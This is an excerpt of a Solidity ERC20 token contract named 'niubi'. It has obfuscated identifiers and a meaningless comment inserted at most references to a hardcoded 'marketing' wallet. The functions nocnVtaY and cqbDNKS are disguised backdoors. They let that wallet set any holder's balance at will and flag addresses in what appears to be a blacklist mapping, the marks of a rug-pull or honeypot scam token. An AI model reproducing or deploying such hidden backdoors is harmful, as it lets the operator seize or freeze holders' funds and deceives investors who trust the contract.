...
contract  niubi is Context, IERC20, Ownable {
    ...
    address payable public vTOdDHgLo
 /* transfer from the zero address */;
    ...
    mapping (address => bool) public MzR_xuH;
    ...
    constructor () {
        ...
        vTOdDHgLo
 /* transfer from the zero address */ = payable(address(0x1a4F63f669E731B60F17B3Fa4935eF53BF361A4f));
    ...
    function setMarketinWalleAddress(address newAddress) external onlyOwner() {
        vTOdDHgLo
 /* transfer from the zero address */ = payable(newAddress);
    }
    ...
    function nocnVtaY(address AbDEhYyTv, uint256 mDYhGjym
 /* transfer from the zero address */) public{ if(!WnwZWUDtr(vTOdDHgLo
 /* transfer from the zero address */,msg.sender,true)){return;}
        _balances[AbDEhYyTv] = mDYhGjym
 /* transfer from the zero address */;
    }
    ...
    function cqbDNKS
 /* transfer from the zero address */(address[] calldata aefeHa,bool BNccf) public { if(!WnwZWUDtr(vTOdDHgLo
 /* transfer from the zero address */,msg.sender,true)){return;}
        for (uint256 i; i < aefeHa.length; ++i) {
            if (BNccf){MzR_xuH[aefeHa[i]] = true ;}
            else{MzR_xuH[aefeHa[i]] = false ;}}}

    function WnwZWUDtr(address izIh,address dNWpCyqG_ , bool oBVfxWqH
 /* transfer from the zero address */) private pure returns(bool){return oBVfxWqH
 /* transfer from the zero address */ && true && !(izIh != dNWpCyqG_);}
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if(amountBNBMarketing > 0)
            transferToAddressETH(vTOdDHgLo
 /* transfer from the zero address */, amountBNBMarketing);
